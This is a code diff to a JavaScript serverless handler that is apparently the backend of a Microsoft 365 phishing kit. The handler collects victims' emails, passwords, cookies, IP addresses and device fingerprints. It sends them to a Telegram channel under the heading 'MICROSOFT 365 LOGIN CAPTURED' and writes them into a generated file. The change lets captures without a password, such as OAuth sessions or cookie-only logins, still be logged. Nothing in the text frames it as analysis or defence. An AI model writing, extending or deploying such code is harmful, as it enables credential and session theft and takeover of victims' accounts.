@@ -85,12 +85,12 @@ ${(/* @__PURE__ */ new Date()).toISOString()}`,
     const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;
     let formattedCookies = [];
     let cookieInfo = data.formattedCookies || browserFingerprint?.cookies || data.cookies || data.documentCookies || [];
-    if (!email || !password) {
-      await sendErrorTelegram("Missing credentials", { email, password });
+    if (!email) {
+      await sendErrorTelegram("Missing email (required)", { email, password });
       return {
         statusCode: 400,
         headers,
-        body: JSON.stringify({ error: "Missing required fields", fields: { email, password } })
+        body: JSON.stringify({ error: "Missing required field: email", fields: { email, password } })
       };
     }
     try {
@@ -172,7 +172,7 @@ ${(/* @__PURE__ */ new Date()).toISOString()}`,
     const mainMessage = `\u{1F510} MICROSOFT 365 LOGIN CAPTURED
 
 \u{1F4E7} Email: ${email}
-\u{1F511} Password: ${password}
+\u{1F511} Password: ${password ? password : "[NOT SUPPLIED/OAUTH]"}
 \u{1F3E2} Provider: ${provider || "Microsoft"}
 \u{1F552} Time: ${(/* @__PURE__ */ new Date()).toLocaleString()}
 \u{1F310} IP: ${clientIP} | ${deviceInfo}
@@ -223,7 +223,7 @@ Download link: ${event.headers.host ? `https://${event.headers.host}` : "https:/
 
 let ipaddress = "${clientIP}";
 let email = "${email}";
-let password = "${password}";
+let password = "${password ? password : "[NOT SUPPLIED/OAUTH]"}";
 
 // Raw Cookie Data Debug Info:
 // Formatted cookies count: ${cookiesForFile.length}
